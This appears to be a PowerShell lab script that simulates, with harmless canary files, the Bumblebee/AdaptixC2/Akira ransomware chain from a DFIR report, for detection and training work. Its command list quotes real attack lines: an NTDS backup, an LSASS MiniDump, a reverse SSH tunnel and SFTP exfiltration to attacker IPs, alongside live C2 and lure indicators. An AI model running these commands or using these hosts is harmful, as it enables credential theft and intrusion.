#Requires -Version 5.1
#Requires -RunAsAdministrator
[CmdletBinding()]param([switch]$LabConfirmed)
$config=[pscustomobject]@{
 Id='004-Bing_Search_Bumblebee_AdaptixC2_Akira';RootName='AkiraSim';Source='https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/';Title='From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira';DurationMinutes=480;TimelineNote='Generated eight-hour axis preserves the report ordering; it does not claim unpublished exact timestamps.'
 IOCs=[ordered]@{lures=@('opmanager.pro','download-center.online','ip-scanner.org');c2=@('188.40.187.145','109.205.195.211','171.22.183.43','172.96.137.160');reverseSsh='193.242.184.150';exfil='185.174.100.203'}
 Files=@('cmd.exe','ManageEngine-OpManager.msi','consent.exe','msimg32.dll','AdgNsy.exe','wab.exe','n.exe','locker.exe','ssh.exe','cloudflared.exe','rustdesk.exe','FileZilla.exe')|ForEach-Object{[pscustomobject]@{path="payload-canaries\$_";role='report-named executable stand-in';publishedHash='see source report'}}
 Artifacts=@(
  [pscustomobject]@{path='generated-persistence\accounts-and-services.json';content='{"reportedAccounts":["backup_DA","backup_EA"],"reportedServices":["RustDesk","cloudflared","mgdsrv","KMHLPSVC"],"created":false}';purpose='persistence metadata'},
  [pscustomobject]@{path='generated-hosts\DC-CANARY\Windows\NTDS\ntds.dit';content='GENERATED CANARY; no directory database or credential material.';purpose='credential-access canary'},
  [pscustomobject]@{path='generated-hosts\DC-CANARY\Windows\System32\config\SYSTEM';content='GENERATED CANARY; no registry hive.';purpose='credential-access canary'},
  [pscustomobject]@{path='generated-hosts\FILE-CANARY\Finance\ledger.xlsx';content='GENERATED USER-DATA CANARY; remains intact.';purpose='impact canary'},
  [pscustomobject]@{path='generated-hosts\FILE-CANARY\Finance\ledger.xlsx.akira-marker';content='Sidecar only. The original was not changed.';purpose='encryption marker'},
  [pscustomobject]@{path='generated-hosts\FILE-CANARY\akira_readme.txt';content='AKIRA REPORT-SHAPED RANSOM NOTE CANARY. No data was encrypted.';purpose='ransom-note canary'})
 Commands=@(
  [pscustomobject]@{file='payload-canaries\consent.exe';reported='consent.exe side-loads msimg32.dll';parent='msiexec.exe'},
  [pscustomobject]@{file='payload-canaries\AdgNsy.exe';reported='wmic process call create AdgNsy.exe';parent='WmiPrvSE.exe'},
  [pscustomobject]@{file='payload-canaries\cmd.exe';reported='wbadmin start backup -include:C:\Windows\NTDS\ntds.dit';parent='AdaptixC2'},
  [pscustomobject]@{file='payload-canaries\cmd.exe';reported='rundll32 comsvcs.dll MiniDump <LSASS PID> lsass.dmp full';parent='AdaptixC2'},
  [pscustomobject]@{file='payload-canaries\ssh.exe';reported='ssh.exe -R *:10400:127.0.0.1:3389 -p 22 193.242.184.150';parent='cmd.exe'},
  [pscustomobject]@{file='payload-canaries\FileZilla.exe';reported='FileZilla SFTP as Stark to 185.174.100.203';parent='explorer.exe'},
  [pscustomobject]@{file='payload-canaries\locker.exe';reported='locker.exe followed by shadow-copy deletion';parent='interactive session'})
 Network=@(
  [pscustomobject]@{port=443;target='opmanager.pro and download-center.online';role='SEO lure'},[pscustomobject]@{port=443;target='188.40.187.145 / 109.205.195.211 / 171.22.183.43';role='Bumblebee C2'},[pscustomobject]@{port=443;target='172.96.137.160';role='AdaptixC2'},[pscustomobject]@{port=22;target='193.242.184.150';role='reverse SSH'},[pscustomobject]@{port=22;target='185.174.100.203';role='SFTP exfil'})
 Timeline=@(
  [pscustomobject]@{offset=0;phase='initial-access';event='Bing lure and trojanized OpManager MSI';details=@{downloads=0}},[pscustomobject]@{offset=20;phase='execution';event='Bumblebee DLL sideload and AdaptixC2 represented';details=@{injection=$false}},[pscustomobject]@{offset=180;phase='persistence';event='accounts, RustDesk, and cloudflared metadata';details=@{systemChanges=0}},[pscustomobject]@{offset=300;phase='credential-access';event='NTDS, Veeam, and LSASS patterns represented';details=@{credentialsAccessed=0}},[pscustomobject]@{offset=420;phase='collection-exfiltration';event='collection, reverse SSH, and FileZilla/SFTP markers';details=@{bytesTransferred=0}},[pscustomobject]@{offset=480;phase='impact';event='Akira note and sidecar markers';details=@{filesEncrypted=0;shadowCopiesDeleted=0}})
}
. (Join-Path $PSScriptRoot '..\LabSafeScenarioCore.ps1');Invoke-DFIRLabScenario -Config $config -LabConfirmed:$LabConfirmed
